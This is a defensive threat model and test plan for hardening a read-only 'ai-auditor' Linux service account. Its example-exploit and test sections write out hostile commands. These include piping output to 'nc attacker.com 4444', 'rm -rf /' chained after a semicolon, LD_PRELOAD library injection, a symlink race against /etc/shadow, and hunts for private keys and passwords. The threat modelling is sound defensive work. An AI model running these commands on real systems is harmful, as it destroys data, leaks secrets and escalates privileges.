# Phase 4: Risk Assessment & Threat Model

## Overview
This document details the security threat model, attack vectors specific to the `ai-auditor` service account, and documented mitigations for each risk.

---

## Executive Summary

### Risk Posture: **HIGH ASSURANCE REQUIRED**

The `ai-auditor` account requires:
- **Authentication:** SSH key only (no password)
- **Authorization:** Read-only operations exclusively
- **Accountability:** All actions logged and auditable
- **Isolation:** Cannot escalate privileges or access sensitive areas

---

## Threat Model: Attack Vectors & Mitigations

## Threat 1: Unauthorized Privilege Escalation

### Attack Vector
Attacker compromises ai-auditor SSH key or exploits sudo misconfiguration to execute commands as root.

### Impact
- **Severity:** CRITICAL
- Full system compromise
- Data breach/manipulation
- Service disruption

### Mitigations

| Mitigation | Implementation | Verification |
|-----------|-----------------|--------------|
| No password stored | Account locked with `passwd -l` | `passwd --status ai-auditor` shows `LK` |
| Explicit sudoers DENY | `ai-auditor ALL=(ALL) DENY: ALL` at end of file | `visudo -c` validates, manual review |
| No shell access via sudo | `!requiretty` allows only non-interactive | Test: `sudo -u ai-auditor bash` (should fail) |
| Command allowlist | Only specific commands listed | Review each entry in sudoers |
| Sudo logging | Separate log file with detailed auditing | Check `/var/log/sudo-ai-auditor.log` |

### Test Case: Escalation Attempt

```bash
# Should fail - no root access
sudo -u ai-auditor sudo -u root whoami
# Expected: permission denied

# Should fail - cannot access root shell
sudo -u ai-auditor sudo su -
# Expected: permission denied

# Should fail - cannot become root directly
sudo -u ai-auditor sudo -i
# Expected: permission denied
```

---

## Threat 2: Shell Escape via Metacharacters

### Attack Vector
Attacker uses shell metacharacters (`;`, `|`, `&`, `$()`, etc.) within allowed command arguments to execute unauthorized commands.

### Impact
- **Severity:** CRITICAL
- Arbitrary command execution
- Complete account compromise
- Bypass of all restrictions

### Example Exploit
```bash
# Intended: sudo ps aux
# Exploit: sudo ps aux; rm -rf /

# Without proper restrictions, semicolon allows chaining
```

### Mitigations

| Mitigation | Implementation | Verification |
|-----------|-----------------|--------------|
| NO WILDCARDS in sudoers | Use explicit full commands only | Review sudoers for `*` usage |
| Command arguments fixed | Specify exact arguments (e.g., `ps aux`) | Can't use `ps *` or `ps -$var` |
| sudo `env_reset` | Clean environment, reset variables | `Defaults:ai-auditor env_reset` |
| Disable shell globbing | Set in .bashrc: `set -o noglob` | Test: `ls /etc/*.conf` (should fail) |
| No shell access | Account shell is restrictive | User can't spawn interactive shell |

### Test Cases: Shell Escape Attempts

```bash
# All should be BLOCKED

# Command chaining with semicolon
sudo -u ai-auditor sudo ps aux; whoami

# Pipe to unauthorized command
sudo -u ai-auditor sudo ps aux | nc attacker.com 4444

# Command substitution with $()
sudo -u ai-auditor sudo find /etc -exec $(/usr/bin/id) \;

# Backtick substitution
sudo -u ai-auditor sudo ps aux `whoami`

# Logical operators
sudo -u ai-auditor sudo find /etc && rm -rf /tmp/*

# Output redirection
sudo -u ai-auditor sudo ps aux > /tmp/exfiltrate.txt

# Variable expansion
sudo -u ai-auditor sudo ps $MALICIOUS_VAR
```

---

## Threat 3: Wildcard & Globbing Exploitation

### Attack Vector
Attacker uses wildcards or glob patterns in sudoers to expand to unintended commands.

### Impact
- **Severity:** HIGH
- Execution of unintended commands
- Privilege escalation potential
- Information disclosure

### Example Exploit

**VULNERABLE sudoers:**
```sudoers
ai-auditor ALL=(ALL) NOPASSWD: /usr/bin/find /etc/*
# This allows: /usr/bin/find /etc/shadow
```

**SECURE sudoers:**
```sudoers
ai-auditor ALL=(ALL) NOPASSWD: /usr/bin/find /etc -type f -readable
# Arguments fully specified, no wildcards
```

### Mitigations

| Mitigation | Implementation | Verification |
|-----------|-----------------|--------------|
| Explicit path arguments | No `*` or `?` in sudoers entries | Manual review of sudoers |
| Argument validation | Each command lists exact arguments needed | Test each allowed command |
| Use command aliases | Group similar commands for clarity | Review `Cmnd_Alias` in sudoers |
| Limited scope | Only allow specific directories | `find /etc` not `find /` |

### Test Case: Wildcard Attempt

```bash
# Allowed - specific arguments
sudo -u ai-auditor sudo find /etc -type f -readable

# Blocked - wildcard not in sudoers
sudo -u ai-auditor sudo find /etc/*
```

---

## Threat 4: Environment Variable Injection

### Attack Vector
Attacker injects malicious environment variables (LD_PRELOAD, LD_LIBRARY_PATH, PATH, etc.) to override system binaries or inject code.

### Impact
- **Severity:** CRITICAL
- Arbitrary code execution via library injection
- System binary hijacking
- Privilege escalation

### Example Exploit

**LD_PRELOAD attack:**
```bash
# Compile malicious .so
gcc -shared -fPIC evil.c -o /tmp/evil.so

# Inject via environment
LD_PRELOAD=/tmp/evil.so sudo /usr/bin/ps aux
# Malicious code executes in context of ps
```

### Mitigations

| Mitigation | Implementation | Verification |
|-----------|-----------------|--------------|
| `env_reset` in sudoers | `Defaults:ai-auditor env_reset` | Check sudoers |
| `env_keep` limited | Only allow safe variables | `env_keep="LANGUAGE LANG LC_*"` |
| `secure_path` set | Override $PATH in sudoers | `secure_path="/usr/local/sbin:..."` |
| SSH `-E` flag disabled | Don't accept client env vars | Verify sshd_config |
| PermitUserEnvironment no | No ~/.ssh/environment file | Check sshd_config |

### Test Case: Environment Injection

```bash
# Should fail - LD_PRELOAD ignored due to env_reset
LD_PRELOAD=/tmp/evil.so sudo -u ai-auditor sudo ps aux

# Should fail - PATH override doesn't affect secure_path
PATH=/tmp:/bin sudo -u ai-auditor sudo /usr/bin/ps aux

# Verify via strace/ltrace that LD_PRELOAD doesn't load
strace -e trace=open,openat \
    sudo -u ai-auditor sudo ps aux 2>&1 | grep -i evil
# Should return nothing
```

---

## Threat 5: Symlink Following & TOCTTOU

### Attack Vector
Attacker creates symlinks to sensitive files to trick commands into accessing unauthorized locations.

### Impact
- **Severity:** HIGH
- Information disclosure of sensitive files
- Arbitrary file access beyond intended scope
- Confusion about what actually runs

### Example Exploit

**Race condition attack:**
```bash
# while loop to race command execution
while true; do
    ln -sf /etc/shadow /tmp/audit_target
    ln -sf /var/log/sensitive.log /tmp/audit_target
done &

# Meanwhile, attacker runs audit command
sudo -u ai-auditor sudo find /tmp -name audit_target
```

### Mitigations

| Mitigation | Implementation | Verification |
|-----------|-----------------|--------------|
| Restrict find scope | Only audit specific directories | `find /etc /var/log` not `find /` |
| Read-only audit | Never execute found files | No `find ... -exec bash` |
| Time-of-check/use | Audit logs for suspicious patterns | Monitor /var/log/sudo-ai-auditor.log |
| Avoid user-writable paths | Never read from /tmp or /var/tmp | Test that /tmp can't be scanned |

### Test Case: Symlink Attack

```bash
# Create symlink to sensitive file
sudo ln -sf /etc/shadow /tmp/symlink_target

# Try to access via symlink (should fail)
sudo -u ai-auditor sudo ls -la /tmp/symlink_target
# OR
sudo -u ai-auditor sudo find /tmp -name symlink_target

# Verify no access to /etc/shadow content
sudo -u ai-auditor sudo cat /etc/shadow
# Expected: permission denied
```

---

## Threat 6: SUID/Capability Exploitation

### Attack Vector
Attacker uses SUID binaries or Linux capabilities to escalate privileges.

### Impact
- **Severity:** HIGH
- Privilege escalation via existing binaries
- Bypass of sudo restrictions
- System compromise

### Example Exploit

```bash
# Some SUID binaries can be exploited
sudo /usr/bin/find /etc -name passwd -exec cat {} \;
# If find is SUID and misconfigured, could access /etc/shadow
```

### Mitigations

| Mitigation | Implementation | Verification |
|-----------|-----------------|--------------|
| Regular SUID audit | Scan for unexpected SUID binaries | Run `find / -perm -4000 -type f` |
| Capability audit | Scan for capabilities beyond needed | `getcap -r /usr/bin` |
| Remove unnecessary SUID | Disable SUID on unused tools | `chmod u-s /path/to/binary` |
| Monitor SUID changes | Alert on new SUID binaries | Cron job checking for changes |

### Test Case: SUID Exploitation

```bash
# Audit all SUID binaries accessible to ai-auditor
sudo -u ai-auditor find / -perm -4000 -type f 2>/dev/null | head

# Verify each is known and necessary
# For each, test if it can escalate privilege:
sudo -u ai-auditor sudo /path/to/suid/binary
# Should not result in root access
```

---

## Threat 7: Information Disclosure

### Attack Vector
Attacker uses allowed commands to access sensitive files containing credentials, private keys, or confidential data.

### Impact
- **Severity:** HIGH
- Credential theft
- Configuration disclosure
- Attack surface expansion

### Example Exploit

```bash
# Use find to locate and read private keys
find / -name '*.pem' -o -name '*.key'

# Use grep to search for passwords in readable files
grep -r 'password=' /etc /opt
```

### Mitigations

| Mitigation | Implementation | Verification |
|-----------|-----------------|--------------|
| Path restrictions | Limit find to specific directories | `find /var/log /etc` not `find /` |
| File permission enforcement | Ensure sensitive files unreadable | `chmod 600 /etc/sudoers` |
| Command limitations | No `-exec` or pipe to uncontrolled commands | Manual sudoers review |
| Audit trail monitoring | Alert on suspicious file access | Check sudo logs for sensitive paths |

### Test Case: Information Disclosure

```bash
# Should fail - /root is not readable
sudo -u ai-auditor sudo find /root -type f

# Should fail - /etc/shadow is not readable to ai-auditor
sudo -u ai-auditor sudo cat /etc/shadow

# Should fail - cannot search entire filesystem
sudo -u ai-auditor sudo find / -name '*.pem'

# Should succeed - only for allowed paths
sudo -u ai-auditor sudo find /var/log -type f -readable
```

---

## Threat 8: Denial of Service (DoS)

### Attack Vector
Attacker uses ai-auditor account to consume system resources or disrupt services.

### Impact
- **Severity:** MEDIUM
- System performance degradation
- Service availability impact
- Log file exhaustion

### Example Exploit

```bash
# Resource exhaustion
while true; do ps aux; done

# Log file exhaustion
for i in {1..100000}; do sudo /usr/bin/ps aux; done
```

### Mitigations

| Mitigation | Implementation | Verification |
|-----------|-----------------|--------------|
| SSH timeout | Set idle timeout in sshd_config | `ClientAliveInterval 1800` |
| Resource limits | Set ulimits for ai-auditor | `/etc/security/limits.d/ai-auditor.conf` |
| Log rotation | Rotate logs to prevent exhaustion | `/etc/logrotate.d/ai-auditor` |
| Rate limiting | Monitor for excessive command execution | Alert in /var/log/sudo-ai-auditor.log |

### Test Case: DoS Prevention

```bash
# Set resource limits for ai-auditor
echo "ai-auditor soft nproc 10" | sudo tee -a /etc/security/limits.d/ai-auditor.conf
echo "ai-auditor hard nproc 20" | sudo tee -a /etc/security/limits.d/ai-auditor.conf

# Test that excessive processes are blocked
# (This will fail after 20 processes for the user)
```

---

## Risk Matrix: Prioritized Threats

| Threat | Severity | Likelihood | Mitigation Status | Priority |
|--------|----------|-----------|------------------|----------|
| Privilege Escalation | CRITICAL | MEDIUM | Multiple layers | P0 |
| Shell Escape | CRITICAL | MEDIUM | Sudoers + env_reset | P0 |
| Environment Injection | CRITICAL | LOW | env_reset configured | P1 |
| Symlink Exploitation | HIGH | LOW | Path restrictions | P1 |
| SUID Abuse | HIGH | LOW | Regular audit | P2 |
| Information Disclosure | HIGH | MEDIUM | Path + permission limits | P1 |
| DoS via Resource Exhaustion | MEDIUM | MEDIUM | Timeouts + limits | P2 |
| Audit Trail Tampering | MEDIUM | LOW | Centralized logging | P2 |

---

## Compliance & Standards

### CIS Linux Benchmarks Alignment
- **1.1** Filesystem Configuration: Restrictive mount options
- **3.1** Network Configuration: Minimal network exposure
- **5.2** SSH Configuration: Key-based auth only, restricted forwarding
- **6.2** User & Group Settings: Least privilege principles

### NIST Cybersecurity Framework
- **Identify:** Threats and vulnerabilities documented
- **Protect:** Mitigations implemented and verified
- **Detect:** Logging and monitoring enabled
- **Respond:** Incident procedures defined
- **Recover:** Backup/restore procedures documented

### Linux PAM Security Model
- Authentication: SSH key only (no password)
- Authorization: Sudo with least privilege
- Accounting: Comprehensive logging enabled

---

## Continuous Risk Management

### Weekly Risk Checks
```bash
#!/bin/bash
# weekly-risk-audit.sh

echo "=== WEEKLY SECURITY AUDIT ==="

# Check for new SUID binaries
echo "[1] SUID Audit"
find / -perm -4000 -type f -newer /var/log/sudo-ai-auditor.log 2>/dev/null | wc -l

# Check capabilities
echo "[2] Capability Audit"
getcap -r /usr/bin | grep -v -- "-" | wc -l

# Check sudoers file changes
echo "[3] Sudoers Integrity"
sudo md5sum /etc/sudoers.d/ai-auditor

# Check log file size (DoS detection)
echo "[4] Audit Log Size"
sudo wc -l /var/log/sudo-ai-auditor.log

# Check for failed sudo attempts
echo "[5] Failed Access Attempts"
sudo grep "COMMAND=\|denied" /var/log/sudo-ai-auditor.log | tail -10
```

### Monthly Risk Review
- [ ] Review threat model for new attack vectors
- [ ] Update sudoers based on new required commands
- [ ] Audit file permissions and ownership
- [ ] Review access logs for suspicious patterns
- [ ] Test all mitigations to ensure effectiveness
- [ ] Update documentation and runbooks

---

## Incident Response

### If ai-auditor Account Compromised

1. **Immediate:**
   - [ ] Revoke SSH key immediately
   - [ ] Lock the account with `passwd -l ai-auditor`
   - [ ] Kill all sessions: `pkill -u ai-auditor`

2. **Investigation:**
   - [ ] Review `/var/log/sudo-ai-auditor.log` for unauthorized commands
   - [ ] Check SSH audit logs for intrusion time
   - [ ] Review system logs for privilege escalation attempts
   - [ ] Scan system for persistence mechanisms

3. **Remediation:**
   - [ ] Generate new SSH keypair
   - [ ] Update authorized_keys
   - [ ] Re-validate sudoers configuration
   - [ ] Run full security validation suite
   - [ ] Rebuild account from scratch if needed

4. **Post-Incident:**
   - [ ] Update threat model with new findings
   - [ ] Document lessons learned
   - [ ] Improve monitoring and alerting
   - [ ] Notify security team

---

## Sign-Off & Approval

**Security Review Date:** _____________  
**Reviewer Name:** _____________  
**Reviewer Title:** _____________  
**Approval:** ☐ APPROVED ☐ APPROVED WITH CONDITIONS ☐ REJECTED  

**Conditions/Notes:**
```
_________________________________________________________________
_________________________________________________________________
```

---

*Last Updated: 2026-08-05*  
*Version: 1.0 - Initial Risk Assessment*
